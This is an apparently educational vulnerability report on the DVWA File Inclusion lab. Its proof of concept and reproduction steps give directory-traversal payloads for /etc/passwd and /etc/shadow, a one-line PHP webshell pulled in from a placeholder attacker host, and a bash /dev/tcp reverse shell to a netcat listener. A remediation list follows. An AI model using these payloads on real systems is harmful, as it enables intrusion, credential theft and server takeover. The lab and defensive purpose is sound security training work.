# Vulnerability Report

CVE-ID: EDU-WEBLAB-2026-T02-13

**Title:** Local and Remote File Inclusion via Unsanitized `page` Parameter Enabling Sensitive File Disclosure and Remote Code Execution

**Affected Lab:** DVWA — File Inclusion Lab

**Component:** File Inclusion Module — `page` Query Parameter (`/vulnerabilities/fi/?page=`)

**Severity:** Critical

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

**CVSS Score:** 9.9

**Description:**
A critical file inclusion vulnerability was identified in the DVWA File Inclusion module, where the application passes a user-supplied `page` query parameter directly to a server-side file inclusion function without any sanitization, path normalization, or allowlist enforcement. The absence of input validation allows an attacker to exploit the vulnerability in two distinct attack chains: Local File Inclusion (LFI), in which directory traversal sequences (`../`) are used to escape the intended directory and read arbitrary sensitive files from the server filesystem (e.g., `/etc/passwd`, `/etc/shadow`), and Remote File Inclusion (RFI), in which a fully qualified external URL is supplied as the `page` value and the server fetches, includes, and executes the remote content as PHP code. The RFI attack vector is enabled by insecure PHP runtime settings (`allow_url_fopen` and `allow_url_include` enabled), which together with the unsanitized parameter allow an unauthenticated-equivalent attacker — requiring only a valid session — to achieve full Remote Code Execution (RCE) on the host system. Successful exploitation of the RFI chain results in complete system compromise, including unauthorized access to all server files, execution of arbitrary operating system commands, and potential for persistent backdoor installation, making this a critical-severity vulnerability demanding immediate remediation.

**Proof of Concept:**
```bash
# --- LOCAL FILE INCLUSION (LFI) ---

# Payload 1: Basic directory traversal to disclose /etc/passwd
http://<target-ip>/vulnerabilities/fi/?page=../../../../etc/passwd

# Expected response: server returns the contents of /etc/passwd, e.g.:
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

# Payload 2: Extended traversal depth for deeper filesystem paths
http://<target-ip>/vulnerabilities/fi/?page=../../../../../etc/shadow
```
```bash
# --- REMOTE FILE INCLUSION (RFI) ---

# Step 1: Host a malicious PHP webshell on the attacker's machine
# File: shell.php (served at http://<attacker-ip>:8000/shell.php)
<?php system($_GET['cmd']); ?>

# Step 2: Start a simple HTTP server on the attacker machine to serve the payload
python3 -m http.server 8000

# Step 3: Trigger RFI by supplying the remote URL as the page parameter
http://<target-ip>/vulnerabilities/fi/?page=http://<attacker-ip>:8000/shell.php&cmd=id

# Expected response body confirms RCE:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Step 4: Escalate to a full reverse shell via the included webshell
# On attacker machine, start Netcat listener:
nc -lvnp 4444

# Trigger reverse shell via the RFI webshell:
http://<target-ip>/vulnerabilities/fi/?page=http://<attacker-ip>:8000/shell.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'
```

**Steps to Reproduce:**

1. Log in to the DVWA application at `http://<target-ip>/login.php` using valid credentials (e.g., `admin` / `password`), navigate to **DVWA Security**, and confirm the Security Level is set to **Low**.
2. Navigate to the File Inclusion module at `http://<target-ip>/vulnerabilities/fi/?page=include.php` and observe that the `page` parameter in the URL directly controls which file the server includes and renders.
3. **Test for Local File Inclusion (LFI):** Modify the `page` parameter in the URL to inject a directory traversal sequence: navigate to `http://<target-ip>/vulnerabilities/fi/?page=../../../../etc/passwd` and submit the request.
4. Observe that the server returns the contents of `/etc/passwd` directly in the response body, confirming successful Local File Inclusion and unauthorized read access to sensitive server filesystem files.
5. Extend the LFI test by attempting to read additional sensitive files such as `/etc/shadow` or application configuration files (e.g., DVWA's `config.inc.php`) to confirm the scope of accessible data is not restricted to a single file.
6. **Test for Remote File Inclusion (RFI):** On the attacker machine, create a malicious PHP file (`shell.php`) containing `<?php system($_GET['cmd']); ?>` and serve it via a simple HTTP server: `python3 -m http.server 8000`.
7. Modify the `page` parameter to point to the remotely hosted payload: navigate to `http://<target-ip>/vulnerabilities/fi/?page=http://<attacker-ip>:8000/shell.php&cmd=id` and submit the request.
8. Observe that the server fetches, includes, and executes the remote PHP file, returning the output of the `id` command (e.g., `uid=33(www-data)`), confirming successful Remote File Inclusion and arbitrary command execution.
9. On the attacker machine, start a Netcat listener: `nc -lvnp 4444`. Trigger a reverse shell by supplying a shell command through the RFI webshell parameter, as shown in the Proof of Concept section.
10. Verify that a reverse shell session is established in the Netcat listener and confirm the level of access obtained (e.g., by executing `id`, `whoami`, and `ls /`) — demonstrating complete Remote Code Execution on the target server via the unsanitized `page` parameter.

**Remediation:**

1. **Implement strict allowlist-based file inclusion:** Replace the dynamic `page` parameter with a server-side map of permitted filenames to actual file paths. The application must only include files explicitly listed in this allowlist and reject all other values with an `HTTP 400 Bad Request` response before any file system operation is performed.
2. **Remove direct user control over file paths entirely:** Refactor the file inclusion logic so that user input never directly influences a file path or inclusion call. Accept only an opaque identifier (e.g., a numeric index or short keyword) that is resolved server-side to a predefined, safe path.
3. **Normalize and validate all paths to prevent directory traversal:** If file path construction from user input cannot be avoided, canonicalize the resolved path using `realpath()` and verify that the result begins with the expected base directory (e.g., `/var/www/html/dvwa/vulnerabilities/fi/`). Reject any path that resolves outside this boundary.
4. **Disable dangerous PHP runtime settings that enable RFI:** Set `allow_url_fopen = Off` and `allow_url_include = Off` in `php.ini`. These directives must be disabled at the server configuration level to prevent remote URL inclusion regardless of application-level controls.
5. **Replace `include()`/`require()` calls with explicit, hardcoded file references:** Audit all instances of `include`, `require`, `include_once`, and `require_once` in the codebase and replace any that accept user-controlled input with hardcoded file references or switch-case logic mapping safe identifiers to safe paths.
6. **Apply the principle of least privilege to the web server process:** Ensure the web server runs under a dedicated, unprivileged account (e.g., `www-data`) with read access restricted exclusively to the web root directory. This limits the files accessible via LFI and reduces the impact of any successful exploitation.
7. **Deploy a Web Application Firewall (WAF) with rules targeting traversal and RFI patterns:** Configure WAF rules to detect and block requests containing directory traversal sequences (`../`, `..%2F`, `%2e%2e%2f`) and remote URL schemes (`http://`, `https://`, `ftp://`) within filesystem-related parameters as a defense-in-depth layer.
8. **Log and alert on all anomalous file inclusion requests:** Record every request to the file inclusion endpoint, including the full `page` parameter value, source IP, session ID, and timestamp. Configure real-time alerts for requests containing traversal sequences, remote URLs, or values not matching the expected allowlist, and treat all such events as active exploitation indicators.

**Discovered By:** Team 2

**Date:** March 8, 2026
